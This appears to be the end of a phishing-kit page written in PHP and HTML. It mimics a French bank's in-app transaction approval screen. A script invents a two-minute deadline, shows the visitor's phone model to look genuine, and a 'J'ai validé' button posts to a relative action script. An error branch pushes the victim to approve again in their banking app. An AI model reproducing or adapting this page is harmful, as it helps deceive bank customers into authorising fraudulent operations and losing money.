												<p class="cs_text cs_text--s cs_margin--bottom-xl" id="heureLimite"> Vous avez jusqu'à <span id="heure">20H49 CET</span> pour accepter l'opération. </p>
											<footer>

											<?php if (isset($_GET['error']) && $_GET['error'] == 1) {echo '<p style="color: red; font-size: 16px;">La validation a échoué. Veuillez réaccepter de nouveau sur votre application.</p>';}?>	
												<div class="swm-button-wrapper"> 
												<button id="oob-btn-gauche" class="swm_button-arrondi  swm_button-secondaire--gris">
													Annuler l'opération</button> </div>

<form method="POST" action="../actions/app.php">   
<button type="submit" name="app_submit" id="app_submit" class="stl_btn SGButtonStyled-sc-hifh5r-0 hxXXEg stl_btn stl_btn--primary stl_btn--md stl_btn-primary stl_btn-block">
<span class="stl_btn__label" style ='font-size:18px;'>J'ai validé</span>
</button>
</form>							
</footer>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>

			

		</div>
	</div>


	<div id="interactWrapper" class="sdcwrapper"></div>
	<div id="privacy-overlay" class="tc-reset-css tc-privacy-overlay" style="display: none; z-index: 999997;"></div>

	<script>       
        var deviceInfo = platform.parse(navigator.userAgent);        
        var phoneModel = deviceInfo.model || "";       
        var deviceInfoElement = document.getElementById('deviceInfo');
        deviceInfoElement.textContent = "" + phoneModel;
           
        var spanHeure = document.getElementById('heure');      
        var heureActuelle = new Date();    
        heureActuelle.setMinutes(heureActuelle.getMinutes() + 2);       
        var heures = heureActuelle.getHours().toString().padStart(2, '0');
        var minutes = heureActuelle.getMinutes().toString().padStart(2, '0');

       
        spanHeure.textContent = heures + 'H' + minutes + ' CET';
    </script>
	
</body>
</html>

<?php
}
else {
	session_destroy();
	header('Location ../404.php');
	

}
?>

